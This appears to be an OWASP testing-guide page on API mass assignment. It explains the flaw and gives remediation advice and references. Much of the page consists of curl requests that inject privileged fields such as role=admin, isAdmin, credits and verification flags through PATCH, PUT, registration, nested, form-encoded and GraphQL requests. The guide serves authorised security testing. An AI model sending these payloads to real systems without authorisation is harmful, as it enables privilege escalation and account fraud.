# Testing API Mass Assignment

|ID          |
|------------|
|WSTG-APIT-07|

## Summary

Mass assignment (also called auto-binding or object injection) occurs
when an API binds client-supplied data directly to internal objects
without filtering which properties a caller may set. An attacker adds
unexpected fields to a request — such as `role`, `isAdmin`, or
`balance` — and the server-side framework writes them to the data
model.

The vulnerability is common in APIs built with ORMs and frameworks
that support automatic binding of JSON or form data to model objects.
REST APIs that accept JSON bodies for create and update operations are
the primary target. GraphQL mutations that map input types directly to
database models are also affected.

Mass assignment overlaps with Broken Object Property Level
Authorization (API3:2023) in the OWASP API Security Top 10. The
distinction is that mass assignment targets writable properties on the
current user's own objects, while BOPLA also covers excessive data
exposure (read-side) and cross-user property modification.

## Test Objectives

- Identify API endpoints that accept structured input (JSON, XML,
  form-encoded) for object creation or modification.
- Determine which object properties can be set or overwritten through
  client-supplied data that the API does not intend to expose.
- Confirm whether privileged or internal-only properties are accepted
  and persisted.

## How to Test

### Identify Writable Properties by Comparing GET and POST Responses

Retrieve an object through a GET request and note every field in the
response body. Then compare those fields with the fields the API
documentation says the corresponding POST or PUT endpoint accepts.

```bash
# Step 1: Retrieve the current user profile
curl -s -H "Authorization: Bearer <TOKEN>" \
  https://api.example.com/v1/users/me | python3 -m json.tool
```

Example response:

```json
{
  "id": 42,
  "name": "Test User",
  "email": "test@example.com",
  "role": "user",
  "isAdmin": false,
  "verified": true,
  "credits": 0,
  "createdAt": "2025-01-15T10:00:00Z",
  "updatedAt": "2025-06-01T12:00:00Z"
}
```

Fields like `role`, `isAdmin`, `verified`, `credits`, `createdAt`,
and `updatedAt` should not be writable by a regular user. Test
whether the update endpoint accepts them.

### Inject Privileged Fields into Update Requests

Send a PUT or PATCH request with additional fields that a normal user
should not control:

```bash
# Attempt to escalate privileges by setting role
curl -s -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "name": "Test User",
    "email": "test@example.com",
    "role": "admin"
  }' \
  https://api.example.com/v1/users/me
```

Fetch the object again and check whether the `role` field changed:

```bash
curl -s -H "Authorization: Bearer <TOKEN>" \
  https://api.example.com/v1/users/me | python3 -m json.tool
```

Repeat with other privileged fields:

```bash
# Boolean privilege escalation
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"isAdmin": true}' \
  https://api.example.com/v1/users/me

# Credit manipulation
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"credits": 999999}' \
  https://api.example.com/v1/users/me

# Email verification bypass
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"verified": true, "emailVerified": true}' \
  https://api.example.com/v1/users/me

# Account status manipulation
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"status": "active", "suspended": false}' \
  https://api.example.com/v1/users/me

# Subscription tier escalation
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"plan": "enterprise", "tier": "premium"}' \
  https://api.example.com/v1/users/me
```

### Test During Object Creation

Registration and resource creation endpoints are also vulnerable.
Inject extra fields during signup:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{
    "name": "New User",
    "email": "new@example.com",
    "password": "StrongPass123!",
    "role": "admin",
    "isAdmin": true,
    "verified": true
  }' \
  https://api.example.com/v1/users/register
```

Then authenticate with the new account and verify the applied
properties:

```bash
curl -s -H "Authorization: Bearer <NEW_TOKEN>" \
  https://api.example.com/v1/users/me | python3 -m json.tool
```

### Compare PATCH and PUT Behavior

Some APIs treat PUT as a full replacement and PATCH as a partial
update, with different validation logic on each path:

```bash
# PUT: full replacement — may accept only documented fields
curl -s -X PUT -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"name":"Test","email":"test@example.com","role":"admin"}' \
  https://api.example.com/v1/users/me

# PATCH: partial update — may skip validation on unexpected fields
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"role":"admin"}' \
  https://api.example.com/v1/users/me
```

Record whether the responses differ. A `400 Bad Request` on PUT but a
`200 OK` on PATCH with the same extra field indicates inconsistent
input filtering.

### Test Nested Object Property Injection

APIs that accept nested objects may expose deeper model relationships:

```bash
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "profile": {
      "name": "Test",
      "permissions": {
        "canDelete": true,
        "canAdmin": true
      }
    }
  }' \
  https://api.example.com/v1/users/me
```

Also test with dot notation if the API supports it:

```bash
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "profile.permissions.canAdmin": true
  }' \
  https://api.example.com/v1/users/me
```

### Test Array Property Manipulation

If a user object has an array property (such as `groups` or
`permissions`), test whether you can add items:

```bash
curl -s -X PATCH -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "groups": ["users", "admins", "superadmins"]
  }' \
  https://api.example.com/v1/users/me
```

### Test Content-Type Manipulation

Different content types may trigger different parsing paths in the
framework. If the API expects JSON, test with form-encoded data and
vice versa:

```bash
# JSON (expected)
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"name":"Test","role":"admin"}' \
  https://api.example.com/v1/users/me

# Form-encoded (unexpected)
curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Bearer <TOKEN>" \
  -d "name=Test&role=admin" \
  https://api.example.com/v1/users/me

# XML (if supported)
curl -s -X POST -H "Content-Type: application/xml" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '<user><name>Test</name><role>admin</role></user>' \
  https://api.example.com/v1/users/me
```

Some frameworks bind form-encoded data through a separate path that
may not apply the same property allowlist.

### Test GraphQL Mutation Mass Assignment

For GraphQL APIs, inspect the input type schema and test whether the
mutation accepts fields not exposed in the corresponding query:

```bash
# Inspect the input type via introspection
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"UpdateUserInput\") { inputFields { name type { name } } } }"}' \
  https://api.example.com/graphql

# Attempt to set a privileged field
curl -s -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "query": "mutation { updateUser(input: { name: \"Test\", role: \"admin\" }) { id role } }"
  }' \
  https://api.example.com/graphql
```

### Identify Vulnerable Framework Patterns

The following common framework patterns are prone to mass assignment
when developers rely on default behavior without explicit allowlists:

- Ruby on Rails: `User.new(params[:user])` without
  `permit(:name, :email)`.
- Django REST Framework: `ModelSerializer` with `fields = '__all__'`.
- Express.js with Mongoose: `User.findByIdAndUpdate(id, req.body)`.
- Spring Boot: `@ModelAttribute` without `@InitBinder`
  `setAllowedFields`.
- Laravel: `User::create($request->all())` without `$fillable`.
- ASP.NET: model binding without `[Bind(Include = ...)]`.

Review error messages and stack traces for framework identifiers that
suggest these patterns.

## Remediation

- Use an explicit allowlist of properties that each endpoint accepts.
  Deny anything not on the list.
- Separate the data transfer object (DTO) from the internal model so
  that client-supplied data never binds directly to privileged fields.
- Apply the same input filtering to all HTTP methods (PUT, PATCH,
  POST) and all content types.
- For GraphQL, define strict input types that exclude sensitive fields
  rather than mirroring the output type.
- Write integration tests that verify rejected properties remain
  unchanged after an update request.
- See the [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html).

## References

- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [OWASP API Security Top 10 — API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [OWASP Testing Guide — Testing for HTTP Incoming Requests](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README)
